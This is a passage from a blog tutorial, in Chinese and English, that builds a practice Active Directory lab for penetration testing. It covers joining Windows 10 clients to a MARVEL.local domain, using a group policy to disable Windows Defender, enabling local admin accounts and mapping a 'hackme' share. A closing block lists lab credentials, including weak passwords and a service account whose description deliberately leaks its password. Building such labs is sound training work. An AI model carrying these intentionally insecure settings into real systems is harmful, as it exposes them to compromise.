<li>or when the policy updates on that computer, If it’s already domain joined, it will get this policy as will</li>
<li>So this will disable defender once we join the domain with our computers</li>
</ul>
<p><img src="/img/ADLAB_Untitled_53.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_54.png" alt="Untitled"></p>
<p>Make sure this machine have IP address</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line">Ethernet adapter Ethernet0:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-<span class="built_in">local</span> IPv6 Address . . . . . : fe80::6da1:be85:db3e:51ea%6</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.19.148</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.19.2</span><br></pre></td></tr></table></figure>

<p>或是手動設置IP地址</p>
<p><img src="/img/ADLAB_Untitled_55.png" alt="Untitled"></p>
<p>這台機器不需要聯網，所以設置靜態IP給他</p>
<p><img src="/img/ADLAB_Untitled_56.png" alt="Untitled"></p>
<h2 id="Joining-Our-Machines-to-the-Domain"><a href="#Joining-Our-Machines-to-the-Domain" class="headerlink" title="Joining Our Machines to the Domain"></a><strong>Joining Our Machines to the Domain</strong></h2><p>兩台win10都要設定</p>
<p>Join these machines to the domain </p>
<ul>
<li>check to make sure that we’re getting all of our policies and that everything’s joined</li>
<li>utilize the accounts that we have for this machine</li>
<li>change the DNS, because need to point this directly at our domain controller</li>
</ul>
<p><img src="/img/ADLAB_Untitled_57.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_58.png" alt="Untitled"></p>
<h3 id="Join-the-domain"><a href="#Join-the-domain" class="headerlink" title="Join the domain"></a>Join the domain</h3><ul>
<li>搜索框打domain &gt; Access work or school &gt;Connect &gt; Join this device to a local Active..</li>
</ul>
<p><img src="/img/ADLAB_Untitled_59.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_60.png" alt="Untitled"></p>
<p>輸入帳號密碼登入</p>
<ul>
<li>username - administrator</li>
<li>passwd - Akali@</li>
</ul>
<p><img src="/img/ADLAB_Untitled_61.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_62.png" alt="Untitled"></p>
<p>back to winser &gt; make sure that actually did join these machines</p>
<p><img src="/img/ADLAB_Untitled_63.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_64.png" alt="Untitled"></p>
<p>兩台win10重登後登入網域下的帳戶，設置相同</p>
<p>並找到 locla users and groups &gt; users &gt; Administrator &gt; Set Password &gt; Proceed &gt; 輸入密碼</p>
<p><img src="/img/ADLAB_Untitled_65.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_66.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_67.png" alt="Untitled"></p>
<p>雙擊Administrator - uncheck Account is disable</p>
<p><img src="/img/ADLAB_Untitled_68.png" alt="Untitled"></p>
<p>Look at the administrators on this computer，並且新增Frank Castle用戶</p>
<ul>
<li>Group &gt; Administrators &gt;Add &gt; Frank Castle</li>
</ul>
<p>THEPUNISHER-2 &gt; Group - Add Frank Castle</p>
<p>SPIDERMAN-2 &gt; Group - Add Peter Parker、Frank Castle</p>
<p><img src="/img/ADLAB_Untitled_69.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_70.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_71.png" alt="THEPUNISHER-2"></p>
<p>THEPUNISHER-2</p>
<p><img src="/img/ADLAB_Untitled_72.png" alt="SPIDERMAN-2"></p>
<p>SPIDERMAN-2</p>
<p>到檔案管理員 &gt; 網路 &gt; 關閉錯誤訊息 &gt; Turn on network discovery and file sharing</p>
<p>點入HYDRA-DC文件能查看到共享文件內容</p>
<p><img src="/img/ADLAB_Untitled_73.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_74.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_75.png" alt="Untitled"></p>
<p>登出當前管理員帳號，登入一般使用者嘗試</p>
<ul>
<li>logon name - .\peterparker</li>
<li>passwd - Akail@</li>
</ul>
<p>文件 &gt; This PC &gt; Computer &gt; Map network..&gt;填入文件位置 <code>\\HYDRA-DC\hackme</code> &gt; 打勾Connect using different credentials &gt; 輸入administrator&#x2F;Akali@</p>
<p><img src="/img/ADLAB_Untitled_76.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_77.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WinServer -&gt;</span><br><span class="line">DC name -  HYDRA-DC</span><br><span class="line">Forest - MARVEL.<span class="built_in">local</span></span><br><span class="line">GPO(Group Policy Management) - Disable Windows Defender</span><br><span class="line">IP - 192.168.19.140</span><br><span class="line"></span><br><span class="line">win10 -&gt;</span><br><span class="line">user -&gt; </span><br><span class="line">+ frankcastle/Akali@@</span><br><span class="line">	+ IP - 192.168.19.149</span><br><span class="line">+ peterparker/Akali@@</span><br><span class="line">	+ IP - 192.168.19.150</span><br><span class="line"></span><br><span class="line">useradd -&gt;</span><br><span class="line">+ admin -&gt;</span><br><span class="line">	+ Tony Stark -&gt;</span><br><span class="line">		+ logon name - tstark</span><br><span class="line">		+ passwd - Akali@@</span><br><span class="line">	+ SQL Service -&gt;</span><br><span class="line">		+ logon name - SQL Service</span><br><span class="line">		+ passwd -&gt; MYpassword123#</span><br><span class="line">		+ description leak the passwd</span><br><span class="line"></span><br><span class="line">+ user -&gt;</span><br><span class="line">	+ Frank Castle - &gt;</span><br><span class="line">		+ logon name - fcastle</span><br><span class="line">		+ passwd - Password1</span><br><span class="line">	+ Peter Parker -&gt;</span><br><span class="line">		+ logon name - pparker</span><br><span class="line">		+ passwd - Password1</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/4/">« Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/">Next »</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2025 Noflag
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>